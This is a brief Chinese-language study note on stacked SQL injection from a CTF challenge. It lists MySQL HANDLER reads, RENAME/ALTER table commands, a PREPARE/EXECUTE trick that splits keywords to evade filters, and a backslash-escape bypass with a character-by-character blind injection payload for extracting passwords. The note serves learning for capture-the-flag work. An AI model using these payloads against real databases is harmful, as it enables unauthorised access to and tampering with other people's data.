# 堆叠注入

参考[2019强网杯随便注](https://www.cnblogs.com/xhds/p/12269987.html)

## 1.通过handler语句查询users表的内容

```mysql
handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
handler yunensec read first; #读取指定表/句柄的首行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
handler yunensec close; #关闭句柄
```

所以可通过1';handler FlagHere open;handler FlagHere read first;#读取数据

需要通过mysql语句先获得表名，如show tables;

## 2.mysql原生语句获得表名等

```mysql
show tables;	//获得所有表名
show columns from words;	//获得列名
rename table `words` to `words1`;	//将words表名改成words1
alter table 表名 change 旧列名 新列名 类型;
alter table 表名 add 列名 数据类型;		//删除用drop 列名即可
```

## 3.Mysql预处理语句prepare、execute、set

```mysql
set @a=concat("sel","ect flag from `1919810931114514`");
prepare hello from @a;	//为上面set的sql语句取个别名
execute hello;	//执行hello即执行设置的sql语句
```

## 4.未过滤\

select * from users where username='$_POST["username"]' and password='$_POST["password"]';

若username=admin\

输入的\会把$_POST["username"]后面的单引号转义失效，sql语句变成了

```sql
select username,password from user where username='admin\' and password=' or 1#'
```

这时可用盲注爆出密码

username=admin\    password=or (ascii(substr(password,1,1))>65)#

题目当语句正确和不正确是不一样的界面，循环判断第n位的数值

比如第一位是O,ascii码为79，第一位大于65语句正确，接着判断地位大于66正确，直至第一位大于79吗，不大于，所以会出现与前面不一样的界面